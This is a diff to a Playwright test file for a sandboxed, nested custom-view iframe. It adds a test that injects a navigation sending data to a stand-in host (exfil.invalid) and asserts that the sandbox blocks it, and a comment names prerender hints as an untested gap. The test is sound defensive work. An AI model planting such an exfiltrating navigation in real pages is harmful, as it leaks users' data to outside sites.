@@ -18,6 +18,9 @@ import { SHIP_GATE_VIEWPORTS } from '../helpers/viewports'
 const FLAG_KEY = 'ff:loop-custom-view'
 const FRAME = 'iframe[title="Custom loop view"]'
 
+// The view runs in a frame inside the frame the page renders (the isolation frame).
+const viewFrame = (page: Page) => page.frameLocator(FRAME).frameLocator('iframe')
+
 async function setFlag(page: Page, value: 'on' | 'off') {
 	await page.addInitScript(
 		([key, v]) => localStorage.setItem(key as string, v as string),
@@ -97,7 +100,7 @@ test.describe('Loop page — custom view', () => {
 			await expect(frame).toBeVisible({ timeout: 15_000 })
 			// Scripts only: no same-origin access to the app's session or storage.
 			await expect(frame).toHaveAttribute('sandbox', 'allow-scripts')
-			const inner = page.frameLocator(FRAME)
+			const inner = viewFrame(page)
 			await expect(inner.getByText('Close the feedback backlog')).toBeVisible()
 			await expect(inner.getByText('2 tasks done')).toBeVisible({ timeout: 15_000 })
 
@@ -108,7 +111,7 @@ test.describe('Loop page — custom view', () => {
 			await expect(frame).toHaveCount(0)
 			await toggle.getByRole('button', { name: 'Custom view' }).click()
 			await expect(frame).toBeVisible()
-			await expect(page.frameLocator(FRAME).getByText('2 tasks done')).toBeVisible({
+			await expect(viewFrame(page).getByText('2 tasks done')).toBeVisible({
 				timeout: 15_000,
 			})
 
@@ -120,6 +123,36 @@ test.describe('Loop page — custom view', () => {
 		})
 	}
 
+	test('a view that reads its data and then navigates away cannot reach another site', async ({
+		page,
+		account,
+	}) => {
+		// The isolation frame's frame-src 'none' blocks a frame navigating itself. Verified in
+		// Chrome only, which is what this suite runs. Resource hints (rel=prerender) are a known
+		// gap and are deliberately not asserted here.
+		await setFlag(page, 'on')
+		const requested: string[] = []
+		await page.route('https://exfil.invalid/**', (route) => {
+			requested.push(route.request().url())
+			return route.abort()
+		})
+		const { loop, file } = await seedLoopWithView(account)
+		await account.api.updateFile(account.workspaceId, file.id, {
+			content: viewHtml(loop.id).replace(
+				'document.getElementById("headline").textContent = r.total.count + " tasks done" }',
+				'document.getElementById("headline").textContent = r.total.count + " tasks done"; location = "https://exfil.invalid/?d=" + r.total.count }',
+			),
+		})
+
+		await page.goto(`/${account.workspaceId}/loops/${loop.id}`)
+
+		await expect(viewFrame(page).getByText('2 tasks done')).toBeVisible({ timeout: 15_000 })
+		await page.waitForTimeout(2_000)
+		expect(requested).toEqual([])
+		// The view is still the one on screen, not a reset or the default page.
+		await expect(viewFrame(page).getByText('2 tasks done')).toBeVisible()
+	})
+
 	for (const theme of ['light', 'dark'] as const) {
 		test(`flag on: the frame is visible in ${theme} mode`, async ({ page, account }) => {
 			await setFlag(page, 'on')
@@ -129,7 +162,7 @@ test.describe('Loop page — custom view', () => {
 			await page.goto(`/${account.workspaceId}/loops/${loop.id}`)
 
 			await expect(page.locator(FRAME)).toBeVisible({ timeout: 15_000 })
-			await expect(page.frameLocator(FRAME).getByText('2 tasks done')).toBeVisible({
+			await expect(viewFrame(page).getByText('2 tasks done')).toBeVisible({
 				timeout: 15_000,
 			})
 		})
